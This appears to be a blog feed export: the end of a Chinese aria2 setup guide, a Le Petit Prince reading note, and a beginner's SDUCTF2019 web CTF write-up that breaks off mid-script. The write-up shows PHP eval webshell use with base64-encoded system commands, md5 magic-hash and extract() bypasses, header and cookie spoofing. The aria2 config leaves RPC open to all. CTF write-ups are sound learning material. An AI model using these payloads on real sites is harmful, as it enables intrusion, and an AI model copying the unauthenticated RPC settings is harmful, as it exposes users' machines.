class="bash"> 在Aria2退出时保存`错误/未完成`的下载任务到会话文件</span></span><br><span class="line">save-session=aria2/aria2.session</span><br><span class="line"><span class="meta">#</span><span class="bash"> 定时保存会话, 0为退出时才保存, 需1.16.1以上版本, 默认:0</span></span><br><span class="line"><span class="meta">#</span><span class="bash">save-session-interval=60</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># RPC相关设置 ##</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 启用RPC, 默认:<span class="literal">false</span></span></span><br><span class="line">enable-rpc=true</span><br><span class="line"><span class="meta">#</span><span class="bash"> 允许所有来源, 默认:<span class="literal">false</span></span></span><br><span class="line">rpc-allow-origin-all=true</span><br><span class="line"><span class="meta">#</span><span class="bash"> 允许非外部访问, 默认:<span class="literal">false</span></span></span><br><span class="line">rpc-listen-all=true</span><br><span class="line"><span class="meta">#</span><span class="bash"> 事件轮询方式, 取值:[epoll, kqueue, port, poll, select], 不同系统默认值不同</span></span><br><span class="line"><span class="meta">#</span><span class="bash">event-poll=select</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> RPC监听端口, 端口被占用时可以修改, 默认:6800</span></span><br><span class="line"><span class="meta">#</span><span class="bash">rpc-listen-port=6800</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 设置的RPC授权令牌, v1.18.4新增功能, 取代 --rpc-user 和 --rpc-passwd 选项</span></span><br><span class="line"><span class="meta">#</span><span class="bash">rpc-secret=&lt;TOKEN&gt;</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 设置的RPC访问用户名, 此选项新版已废弃, 建议改用 --rpc-secret 选项</span></span><br><span class="line"><span class="meta">#</span><span class="bash">rpc-user=&lt;USER&gt;</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 设置的RPC访问密码, 此选项新版已废弃, 建议改用 --rpc-secret 选项</span></span><br><span class="line"><span class="meta">#</span><span class="bash">rpc-passwd=&lt;PASSWD&gt;</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 是否启用 RPC 服务的 SSL/TLS 加密,</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 启用加密后 RPC 服务需要使用 https 或者 wss 协议连接</span></span><br><span class="line"><span class="meta">#</span><span class="bash">rpc-secure=<span class="literal">true</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 在 RPC 服务中启用 SSL/TLS 加密时的证书文件,</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 使用 PEM 格式时，您必须通过 --rpc-private-key 指定私钥</span></span><br><span class="line"><span class="meta">#</span><span class="bash">rpc-certificate=/path/to/certificate.pem</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 在 RPC 服务中启用 SSL/TLS 加密时的私钥文件</span></span><br><span class="line"><span class="meta">#</span><span class="bash">rpc-private-key=/path/to/certificate.key</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># BT/PT下载相关 ##</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 当下载的是一个种子(以.torrent结尾)时, 自动开始BT任务, 默认:<span class="literal">true</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash">follow-torrent=<span class="literal">true</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> BT监听端口, 当端口被屏蔽时使用, 默认:6881-6999</span></span><br><span class="line">listen-port=51413</span><br><span class="line"><span class="meta">#</span><span class="bash"> 单个种子最大连接数, 默认:55</span></span><br><span class="line"><span class="meta">#</span><span class="bash">bt-max-peers=55</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 打开DHT功能, PT需要禁用, 默认:<span class="literal">true</span></span></span><br><span class="line">enable-dht=false</span><br><span class="line"><span class="meta">#</span><span class="bash"> 打开IPv6 DHT功能, PT需要禁用</span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="built_in">enable</span>-dht6=<span class="literal">false</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> DHT网络监听端口, 默认:6881-6999</span></span><br><span class="line"><span class="meta">#</span><span class="bash">dht-listen-port=6881-6999</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 本地节点查找, PT需要禁用, 默认:<span class="literal">false</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash">bt-enable-lpd=<span class="literal">false</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 种子交换, PT需要禁用, 默认:<span class="literal">true</span></span></span><br><span class="line">enable-peer-exchange=false</span><br><span class="line"><span class="meta">#</span><span class="bash"> 每个种子限速, 对少种的PT很有用, 默认:50K</span></span><br><span class="line"><span class="meta">#</span><span class="bash">bt-request-peer-speed-limit=50K</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 客户端伪装, PT需要</span></span><br><span class="line">peer-id-prefix=-TR2770-</span><br><span class="line">user-agent=Transmission/2.77</span><br><span class="line">peer-agent=Transmission/2.77</span><br><span class="line"><span class="meta">#</span><span class="bash"> 当种子的分享率达到这个数时, 自动停止做种, 0为一直做种, 默认:1.0</span></span><br><span class="line">seed-ratio=0</span><br><span class="line"><span class="meta">#</span><span class="bash"> 强制保存会话, 即使任务已经完成, 默认:<span class="literal">false</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 较新的版本开启后会在任务完成后依然保留.aria2文件</span></span><br><span class="line"><span class="meta">#</span><span class="bash">force-save=<span class="literal">false</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> BT校验相关, 默认:<span class="literal">true</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash">bt-hash-check-seed=<span class="literal">true</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 继续之前的BT任务时, 无需再次校验, 默认:<span class="literal">false</span></span></span><br><span class="line">bt-seed-unverified=true</span><br><span class="line"><span class="meta">#</span><span class="bash"> 保存磁力链接元数据为种子文件(.torrent文件), 默认:<span class="literal">false</span></span></span><br><span class="line">bt-save-metadata=true</span><br></pre></td></tr></table></figure><p><strong>注意修改以下选项：</strong></p><p>dir=\path\to\Download\ （下载文件保存路径，改为你想要的）</p><p>log=\path\to\Aria2\Aria2.log （日志文件，路径D:\App\Aria2\改为你安装aria2的路径）</p><p>input-file=\path\to\Aria2\aria2.session</p><p>save-session=\path\to\Aria2\aria2.session</p><p>以下是可以自动隐藏运行aria2的脚本</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">CreateObject</span><span class="params">(<span class="string">"WScript.Shell"</span>)</span></span><span class="selector-class">.Run</span> <span class="string">"D:\App\Aria2\aria2c.exe --conf-path=aria2.conf"</span>,<span class="number">0</span></span><br></pre></td></tr></table></figure><p><strong>3</strong>. 管理Aria 2 下载任务</p><ul><li>首先我们要打开Aria2 的WebUI，即YAWW或者AriaNg</li><li>然后再页面的设置中将JSON-RPC Path设置为<a href="http://localhost:6800/jsonrpc" target="_blank" rel="noopener">http://localhost:6800/jsonrpc</a></li><li>点保存，即可。</li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Le Petit Prince Note</title>
      <link href="/2019/11/26/Le-Petit-Prince-Note/"/>
      <url>/2019/11/26/Le-Petit-Prince-Note/</url>
      
        <content type="html"><![CDATA[<h1 id="Le-Petit-Prince"><a href="#Le-Petit-Prince" class="headerlink" title="Le Petit Prince"></a>Le Petit Prince</h1><p>小王子</p><p>希望我能如小王子一样，被一朵玫瑰所驯化~</p><p>希望我下次再读这本书时会有不一样的感受把。</p><hr><ul><li><p>我告诉你这么多有关B612号小行星的事情，让你知道它的编号，是因为大人。大人热爱数字。……</p></li><li><p>如果有人爱上一朵花，天上的星星有亿万颗，而这朵花只长在其中一颗上，这足以让他再仰望夜空时感到很快乐。他会告诉自己：“在星空的某处有我的花。”</p></li><li><p>可惜从前我什么都不懂！我应该看着她的行动，而不是听她的言语！她为我散发芬芳，点亮我的生活。我不应该离开她的，我应该看出藏在她那些后面的柔情。花儿的心事好难捉摸的！当时我太小了，不懂得爱是什么。</p></li><li><p>“那你可以审判自己，”国王回答说，“这是最难的。审判自己比审判别人难得多。如果你能正确地审判自己，那你就是真正的聪明人”、</p></li><li><p>看东西只有用心才能看得清楚，重要的东西用眼睛看不见的。</p></li><li><p>正是你为你的玫瑰付出的时间，使得你的玫瑰是如此的重要。</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> Reading </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>SDUCTF2019-wp</title>
      <link href="/2019/11/15/SDUCTF2019-wp/"/>
      <url>/2019/11/15/SDUCTF2019-wp/</url>
      
        <content type="html"><![CDATA[<h1 id="SDUCTF2019-WriteUp"><a href="#SDUCTF2019-WriteUp" class="headerlink" title="SDUCTF2019-WriteUp"></a><center>SDUCTF2019-WriteUp</center></h1><p>刚入门了ctf2周，便有新生赛玩，真好。</p><p>PS.刚准备写wp又放出来一题QAQ</p><p>！！！写wp一半又放出题目</p><p>说好的周六早上放题的，结果早上起来一脸懵逼</p><p>校园网下pwntools下到崩溃啊啊啊啊啊</p><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a><center>Web</center></h2><h3 id="0x01-最简答的Web题"><a href="#0x01-最简答的Web题" class="headerlink" title="0x01 最简答的Web题"></a>0x01 最简答的Web题</h3><blockquote><p> 题目描述：flag就在html里面，右键点击查看源代码即可查看 </p></blockquote><p>直接F12查看源码，找到flag</p><p><img src="https://magic-king.net/images/loading.gif" data-original="SDUCTF2019-wp\web1.jpg" alt></p><h3 id="0x02-按钮点击"><a href="#0x02-按钮点击" class="headerlink" title="0x02 按钮点击"></a>0x02 按钮点击</h3><blockquote><p>题目描述： 想方设法点击按钮 </p></blockquote><p>进入页面一个灰色的按钮，F12查看源码</p><p><img src="https://magic-king.net/images/loading.gif" data-original="SDUCTF2019-wp\web2-1.jpg" alt></p><p>删除button标签里的disabled即可点击按钮</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">style</span>=<span class="string">"width: 150px; height: 60px; font-size: 30px;"</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">onclick</span>=<span class="string">"c()"</span> <span class="attr">value</span>=<span class="string">"flag"</span> <span class="attr">disabled</span>=<span class="string">""</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://magic-king.net/images/loading.gif" data-original="SDUCTF2019-wp\web2-3.jpg" alt></p><p>后面好奇，发现flag就在click2.js里，被base64加密过</p><p><img src="https://magic-king.net/images/loading.gif" data-original="SDUCTF2019-wp\web2-2.jpg" alt></p><h3 id="0x03-量子波动速读"><a href="#0x03-量子波动速读" class="headerlink" title="0x03 量子波动速读"></a>0x03 量子波动速读</h3><blockquote><p>题目描述： 你会量子波动速读吗？ </p></blockquote><p>进入页面就一个按钮，点击查看，发现一闪而过的fakeflag</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">onclick</span>=<span class="string">"window.location.href = 'flag_is_here.html'"</span>&gt;</span></span><br><span class="line">    点击查看flag</span><br><span class="line"><span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br></pre></td></tr></table></figure><p>源码如上，输入<code>url/flag_is_here.html</code>发现就是刚才一闪而过的页面</p><p>利用burpsuite抓包即可，因为所有请求被burpsuite拦截，所以可以看到<code>/flag_is_here.html</code>但是页面上给的是fake ctf，明显不是flag，查看源码得到flag，我是直接用repeater发一个包获得Response。</p><p><img src="https://magic-king.net/images/loading.gif" data-original="SDUCTF2019-wp\web3.jpg" alt></p><h3 id="0x04-芝麻开门"><a href="#0x04-芝麻开门" class="headerlink" title="0x04 芝麻开门"></a>0x04 芝麻开门</h3><blockquote><p>题目描述： 简单的提交，芝麻开门 </p></blockquote><p><img src="https://magic-king.net/images/loading.gif" data-original="SDUCTF2019-wp\web4.jpg" style="zoom:50%;"></p><p>直接复制题目的zhimakaimen进去，返回的是口令错误</p><p><img src="https://magic-king.net/images/loading.gif" data-original="SDUCTF2019-wp\web4-1.jpg" alt></p><p>查看burpsuite拦截的包，好像是因为他的输入框有长度限制，所以少了一个字母</p><p><img src="https://magic-king.net/images/loading.gif" data-original="SDUCTF2019-wp\web4-2.jpg" alt></p><p>利用burpsuite的repeater重新发一个完整的包，得到flag</p><h3 id="0x05-Funny-Button"><a href="#0x05-Funny-Button" class="headerlink" title="0x05 Funny Button"></a>0x05 Funny Button</h3><blockquote><p>题目描述： 有趣的按钮，你能点到吗？ </p></blockquote><p>即示例的题目，删除html的css或js都可以，甚至可以用tab键选中button按钮，点击去就是flag</p><h3 id="0x06-曲奇"><a href="#0x06-曲奇" class="headerlink" title="0x06 曲奇"></a>0x06 曲奇</h3><blockquote><p>题目描述： 你喜欢吃曲奇饼干吗？ </p></blockquote><p>曲奇==cookies，直接查看网站cookies即可</p><p><img src="https://magic-king.net/images/loading.gif" data-original="SDUCTF2019-wp\web6.jpg" alt></p><p>flag即在内容里，注意flag要进行url解码</p><h3 id="0x07-GET"><a href="#0x07-GET" class="headerlink" title="0x07 GET"></a>0x07 GET</h3><blockquote><p>题目描述： 你就是个没有感情的浏览器 </p></blockquote><p><img src="https://magic-king.net/images/loading.gif" data-original="SDUCTF2019-wp\web7.jpg" alt></p><p><img src="https://magic-king.net/images/loading.gif" data-original="SDUCTF2019-wp\web7-2.jpg" alt></p><p>我是一个莫得感情的get机器</p><h3 id="0x08-未来浏览器"><a href="#0x08-未来浏览器" class="headerlink" title="0x08 未来浏览器"></a>0x08 未来浏览器</h3><blockquote><p>题目描述：  小王正在追剧《亲爱的，热爱的》，电脑屏幕。。。。（谁帮我编个） 当他再次醒来。。。。。。。 </p></blockquote><p><img src="https://magic-king.net/images/loading.gif" data-original="SDUCTF2019-wp\web8.jpg" alt></p><p>有题目已知，用burpsuite改http头属性<code>User-Agent</code>即可</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/6666.6.6666.66 Safari/537.36</span><br></pre></td></tr></table></figure><p>改后发包得到flag</p><h3 id="0x09-POST"><a href="#0x09-POST" class="headerlink" title="0x09 POST"></a>0x09 POST</h3><blockquote><p>题目描述：  你就是一个没有感情的浏览器 </p></blockquote><p><img src="https://magic-king.net/images/loading.gif" data-original="SDUCTF2019-wp\web9.jpg" alt></p><p><img src="https://magic-king.net/images/loading.gif" data-original="SDUCTF2019-wp\web9-2.jpg" style="zoom:50%;"></p><p>我只是一个莫得感情的post机器</p><p>利用firefox插件HackBar发送post请求，或者用burpsuite也行</p><h3 id="0x0a-vim好用啊"><a href="#0x0a-vim好用啊" class="headerlink" title="0x0a vim好用啊"></a>0x0a vim好用啊</h3><blockquote><p>题目描述：  小明同学用vim编辑主页的时候，实验室断电了！ </p></blockquote><p><img src="https://magic-king.net/images/loading.gif" data-original="SDUCTF2019-wp\web10.jpg" alt></p><p>由题目得知用vim时断电，用过vim的人都知道，当vim非正常退出时会创建一个保护的缓存文件，现在word也一样。</p><p>直接百度搜vim异常退出的备份文件，因为上次做过类似的，试试<code>index.php.bak</code>和<code>index.php~</code>没用，就百度了一下，得知备份文件格式为<code>.index.php.swp</code>，访问<code>url/.index.php.swp</code>下载文件得到<code>.index.php.swp</code></p><p><img src="https://magic-king.net/images/loading.gif" data-original="SDUCTF2019-wp\web10-2.jpg" alt></p><p>得知flag在<code>url/vimvimvimvim.php</code>里，果然vim是最好的编辑器（狗头保命</p><h3 id="0x0b-一句话木马"><a href="#0x0b-一句话木马" class="headerlink" title="0x0b 一句话木马"></a>0x0b 一句话木马</h3><blockquote><p>题目描述： 听说过<strong>一句话木马</strong>吗？<br>                    听说过<strong>中国菜刀</strong>吗？<br>                    听说过<strong>中国蚁剑</strong>吗？<br>                    快去了解一下吧！！</p></blockquote><p><img src="https://magic-king.net/images/loading.gif" data-original="SDUCTF2019-wp\web11.jpg" alt></p><p>看刀<code>&lt;!--php eval(@$_POST[&quot;cmd&quot;]);--&gt;</code>就可知是一句话木马，对这个稍微了解一下，去github获取中国蚁剑即可</p><p>不过有一个坑，就是他默认访问是<code>index.php</code>，但是通过中国蚁剑连不上，回头看页面，发现在题目中有一个<code>shell.php</code>，于是尝试<code>url/shell.php</code>加上密码<code>cmd</code>，成功连上得到flag</p><p><img src="https://magic-king.net/images/loading.gif" data-original="SDUCTF2019-wp\web11-2.jpg" alt></p><h3 id="0x0c-达拉崩吧"><a href="#0x0c-达拉崩吧" class="headerlink" title="0x0c 达拉崩吧"></a>0x0c 达拉崩吧</h3><blockquote><p>题目描述：  达拉崩吧打怪小游戏 </p></blockquote><p><img src="https://magic-king.net/images/loading.gif" data-original="SDUCTF2019-wp\web12.jpg" alt></p><p>进入页面是个小游戏，发现是hackergame2019原题嘤嘤嘤</p><p>原题wp： <a href="https://github.com/ustclug/hackergame2019-writeups/blob/master/official/达拉崩吧大冒险/README.md" target="_blank" rel="noopener">https://github.com/ustclug/hackergame2019-writeups/blob/master/official/%E8%BE%BE%E6%8B%89%E5%B4%A9%E5%90%A7%E5%A4%A7%E5%86%92%E9%99%A9/README.md</a> </p><p>在买菜这里，有一个大整数溢出，<del>后续会搞懂这个原理</del></p><p>原理如下： <a href="https://blog.csdn.net/zhenghhgz/article/details/78657917" target="_blank" rel="noopener">https://blog.csdn.net/zhenghhgz/article/details/78657917</a> </p><blockquote><p>原意是javascript的所有数字，无论整数还是小数，类型都为Number，为64位浮点数。因此，JavaScript中所有的数都是浮点数。遵循IEEE 754标准（浮点数算术标准），JavaScript所能表示的数值范围为正负1.7976931348623157乘以10的308次方，其最小所能表示的小数为正负5乘以10的负324次方，这两个边界值可以分别通过访问Number对象的MAX_VALUE属性和MIN_VALUE属性来获取。</p><p>JavaScript能表示并进行精确算术运算的整数范围为：正负2的53次方，也即从最小值-9007199254740992到最大值+9007199254740992之间的范围；对于超过这个范围的整数，JavaScript依旧可以进行运算，但却不保证运算结果的精度。值得注意的是，对于整数的位运算（比如移位等操作），JavaScript仅支持32位整型数，也即从-2147483648到+2147483647之间的整数。</p></blockquote><p><img src="https://magic-king.net/images/loading.gif" data-original="SDUCTF2019-wp\web12-2.jpg" alt></p><p><img src="https://magic-king.net/images/loading.gif" data-original="SDUCTF2019-wp\web12-3.jpg" style="zoom:50%;"></p><p>然后得到flag</p><p><img src="https://magic-king.net/images/loading.gif" data-original="SDUCTF2019-wp\web12-4.jpg" alt></p><h3 id="0x0d-HTTP头"><a href="#0x0d-HTTP头" class="headerlink" title="0x0d HTTP头"></a>0x0d HTTP头</h3><blockquote><p>题目描述： 你了解http头吗？ </p></blockquote><p><img src="https://magic-king.net/images/loading.gif" data-original="SDUCTF2019-wp\web13.jpg" alt></p><p>根据题目，直接查看http Response Headers</p><p>得到flag：<code>F1ag: flag{096b5778-cf23-4f03-8c45-2505b7670b89}</code></p><h3 id="0x0e-robots"><a href="#0x0e-robots" class="headerlink" title="0x0e robots"></a>0x0e robots</h3><blockquote><p>题目描述： 你听说过robots协议吗？<br>他可是每个机器人都需要遵守的协议啊！（笑话） </p></blockquote><p>由题目知，robots是一个限制爬虫的东西，直接访问<code>url/robots.txt</code></p><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">User-<span class="string">agent:</span> *</span><br><span class="line"><span class="string">Disallow:</span> /</span><br><span class="line"><span class="string">Disallow:</span> f1ag_1s_h3re.php</span><br></pre></td></tr></table></figure><p>得到如上页面，访问<code>url/f1ag_1s_h3re.php</code>，得到flag</p><h3 id="0x0f-你的IP不太对"><a href="#0x0f-你的IP不太对" class="headerlink" title="0x0f 你的IP不太对"></a>0x0f 你的IP不太对</h3><blockquote><p>题目描述：小伙计，你的IP不太对啊<br>这个网站可不是任何ip都能访问的</p></blockquote><p>由题目可知，需要改ip成<code>111.111.111.111</code>访问，易知是XFF伪造</p><p>利用burpsuite抓包，在header里加上<code>X-Forwarded-For:111.111.111.111</code>即可，发送包，得到flag</p><h3 id="0x10-登录"><a href="#0x10-登录" class="headerlink" title="0x10 登录"></a>0x10 登录</h3><blockquote><p>题目描述： 小王做了一个网站需要登录，但是验证貌似有点漏洞 </p></blockquote><p>进入页面之后发现button是没有用的，F5刷新之后抓包，发现有一个cookie</p><p><img src="https://magic-king.net/images/loading.gif" data-original="SDUCTF2019-wp\web17-1.jpg" alt></p><p>尝试将Cookie改成<code>Cookie: Login=1</code>，发现成功得到flag在button上</p><p><img src="https://magic-king.net/images/loading.gif" data-original="SDUCTF2019-wp\web17-2.jpg" alt></p><h3 id="0x11-破解md5"><a href="#0x11-破解md5" class="headerlink" title="0x11 破解md5"></a>0x11 破解md5</h3><blockquote><p>题目描述： md5是坚不可破的，是真的吗？ </p></blockquote><p><img src="https://magic-king.net/images/loading.gif" data-original="SDUCTF2019-wp\web18-1.jpg" alt></p><p>进入页面之后直接查看源码，如题直接百度搜索php MD5漏洞。</p><blockquote><p>引自： <a href="https://blog.csdn.net/qq_19980431/article/details/83018232" target="_blank" rel="noopener">https://blog.csdn.net/qq_19980431/article/details/83018232</a> </p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- </span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'a'</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>($_GET[<span class="string">'b'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> ($_GET[<span class="string">'a'</span>] != $_GET[<span class="string">'b'</span>])</span><br><span class="line">    <span class="keyword">if</span> (md5($_GET[<span class="string">'a'</span>]) == md5($_GET[<span class="string">'b'</span>]))</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'Flag: '</span>.$flag);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">'Wrong.'</span>;</span><br><span class="line">&#125;</span><br><span class="line"> --&gt;</span><br></pre></td></tr></table></figure><p>若要求满足上述条件则<br>那么要求name和password数值不同但是MD5相同，在这里可以利用绕过。<br>PHP在处理哈希字符串时，它把每一个以“0E”开头的哈希值都解释为0，所以如果两个不同的密码经过哈希以后，其哈希值都是以“0E”开头的，那么PHP将会认为他们相同，都是0。 </p><blockquote><p><strong>以下值在md5加密后以0E开头：</strong></p><ul><li>QNKCDZO</li><li>240610708</li><li>s878926199a</li><li>s155964671a</li><li>s214587387a</li><li>s214587387a</li></ul><p><strong>以下值在sha1加密后以0E开头：</strong></p><ul><li>sha1(‘aaroZmOk’)</li><li>sha1(‘aaK1STfY’)</li><li>sha1(‘aaO8zKZF’)</li><li>sha1(‘aa3OFF9m’)</li></ul></blockquote><p>直接传入<code>url/?a=QNKCDZO&amp;b=240610708</code>，得到flag</p><h3 id="0x12-php是最好的语言"><a href="#0x12-php是最好的语言" class="headerlink" title="0x12 php是最好的语言"></a>0x12 php是最好的语言</h3><blockquote><p>题目描述： php是最好的语言? </p></blockquote><p><img src="https://magic-king.net/images/loading.gif" data-original="SDUCTF2019-wp\web19.jpg" alt></p><p>进入页面如上图，点击查看source.php</p><p><img src="https://magic-king.net/images/loading.gif" data-original="SDUCTF2019-wp\web19-2.jpg" alt></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">if</span> ($_SERVER[<span class="string">"REQUEST_METHOD"</span>] == <span class="string">"POST"</span>) &#123;</span><br><span class="line">    $flag=<span class="string">"flag&#123;this_is_flag&#125;"</span>;</span><br><span class="line">    $pass=<span class="string">""</span>;</span><br><span class="line">    $thepassword_123=<span class="string">"不告诉你"</span>;</span><br><span class="line">    extract($_POST);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;div&gt;</span><br><span class="line">    &lt;p&gt;<span class="meta">&lt;?php</span> <span class="keyword">if</span> ($pass == $thepassword_123) &#123; <span class="keyword">echo</span> $flag;&#125; <span class="keyword">else</span> &#123;<span class="keyword">echo</span> <span class="string">"ha,你永远猜不到"</span>;&#125; <span class="meta">?&gt;</span>&lt;/p&gt;</span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure><p>得到php源码，百度php extract函数，得知<code>extract()</code>有个变量覆盖漏洞</p><p>由php源码得知所有变量名，直接出入post参数<code>pass=&amp;thepassword_123=</code></p><p>得到flag</p><p><img src="https://magic-king.net/images/loading.gif" data-original="SDUCTF2019-wp\web19-3.jpg" alt></p><h3 id="0x13-一句话木马2"><a href="#0x13-一句话木马2" class="headerlink" title="0x13 一句话木马2"></a>0x13 一句话木马2</h3><blockquote><p>题目描述： 在现实世界中，最原始的一句话木马往往会被waf给拦截，所以在使用过程中一般会进行编码或者加密。<br>这里使用最简单的编码，你能成功利用这个后门吗？ </p></blockquote><p>进入网页查看源码</p><p><img src="https://magic-king.net/images/loading.gif" data-original="SDUCTF2019-wp\web20.jpg" alt></p><p>百度得知waf是<code>Web Application Firewall</code>的简称。</p><p>这题应该是要绕过waf，进行获取webshell</p><p>由<code>&lt;!--php @eval(@base64_decode($_POST[&quot;cmd&quot;])); --&gt;</code>和题目shell.php得知：实在shell.php执行一句话木马</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">system(<span class="string">'ls'</span>);</span><br><span class="line">base64<span class="meta">&gt;&gt;&gt;</span>c3lzdGVtKCdscycpOw==</span><br><span class="line">system(<span class="string">'cat ffffllllaaaagggg'</span>)</span><br><span class="line">base64<span class="meta">&gt;&gt;&gt;</span>c3lzdGVtKCdjYXQgZmZmZmxsbGxhYWFhZ2dnZycpOw==</span><br></pre></td></tr></table></figure><p>注：别在网页中解base64，不同网页也许会将字符串先url编码或者Unicode编码在进行base64加密，直接用burpsuite带的base64encode，然后发包即可</p><p><img src="https://magic-king.net/images/loading.gif" data-original="SDUCTF2019-wp\web20-1.jpg" alt></p><p>得知flag在同目录下的ffffllllaaaagggg里</p><p><img src="https://magic-king.net/images/loading.gif" data-original="SDUCTF2019-wp\web20-2.jpg" alt></p><p>得到flag</p><h3 id="0x14-拼手速"><a href="#0x14-拼手速" class="headerlink" title="0x14 拼手速"></a>0x14 拼手速</h3><blockquote><p>题目描述： 你就是个没有感情的浏览器，但是你的手速够快吗？ </p></blockquote><p>进入页面</p><p><img src="https://magic-king.net/images/loading.gif" data-original="SDUCTF2019-wp\web21.jpg" alt></p><p>如题，提交get请求<code>url/?first=cyber</code></p><p><img src="https://magic-king.net/images/loading.gif" data-original="SDUCTF2019-wp\web21-2.jpg" alt></p><p>如题，提交post请求<code>sceond=ans</code>（因为计算式每次都会变，所以我这用ans替代，不过也没关系，得到如下页面</p><p><img src="https://magic-king.net/images/loading.gif" data-original="SDUCTF2019-wp\web21-3.jpg" alt></p><p>因为每次刷新get页面是计算式都会变，所以我想到了用python的requests的库，脚本如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://url/?first=cyber"</span></span><br><span class="line">reflag = <span class="string">'\d\*\d\+\d\*\d'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">qa</span><span class="params">()</span>:</span></span><br><span class="line">4r1 = requests.get(url)</span><br><span class="line">4print(r1.text)</span><br><span class="line">4r2 = re.search(reflag,r1.text)</span><br><span class="line">4print(r2.group())</span><br><span class="line">4ans = eval(r2.group())</span><br><span class="line">4print(ans)</span><br><span class="line">4ck = str(r1.cookies)</span><br><span class="line">4pd = re.search(<span class="string">'PHPSESSID=.* for'</span>,ck)</span><br><span class="line">4pd = pd.group().split(<span class="string">' for'</span>)[<span class="number">0</span>]</span><br><span class="line">4print(pd)</span><br><span class="line">4header = &#123;</span><br><span class="line">4<span class="string">"User-Agent"</span>: <span class="string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 